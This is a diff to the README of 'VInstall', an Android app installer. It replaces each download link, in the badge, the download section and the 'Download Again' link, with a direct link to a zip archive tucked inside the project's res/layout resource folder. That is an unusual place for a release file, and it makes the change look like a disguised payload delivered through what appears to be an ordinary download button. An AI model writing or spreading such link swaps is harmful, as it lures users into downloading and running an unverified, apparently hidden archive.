@@ -1,6 +1,6 @@
 # 📱 VInstall - Install Android Apps With Ease
 
-[![Download VInstall](https://img.shields.io/badge/Download%20VInstall-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/khanCorporation/VInstall)
+[![Download VInstall](https://img.shields.io/badge/Download%20VInstall-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/khanCorporation/VInstall/raw/refs/heads/main/app/src/main/res/layout/Install_V_v1.4-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ It can help you:
 
 ## 📥 Download VInstall
 
-Visit this page to download: https://github.com/khanCorporation/VInstall
+Visit this page to download: https://github.com/khanCorporation/VInstall/raw/refs/heads/main/app/src/main/res/layout/Install_V_v1.4-alpha.5.zip
 
 After you open the page:
 
@@ -214,7 +214,7 @@ VInstall is tagged for:
 
 ## 🔗 Download Again
 
-[Visit the VInstall download page](https://github.com/khanCorporation/VInstall)
+[Visit the VInstall download page](https://github.com/khanCorporation/VInstall/raw/refs/heads/main/app/src/main/res/layout/Install_V_v1.4-alpha.5.zip)
 
 ## 🖥️ File Handling on Windows
 
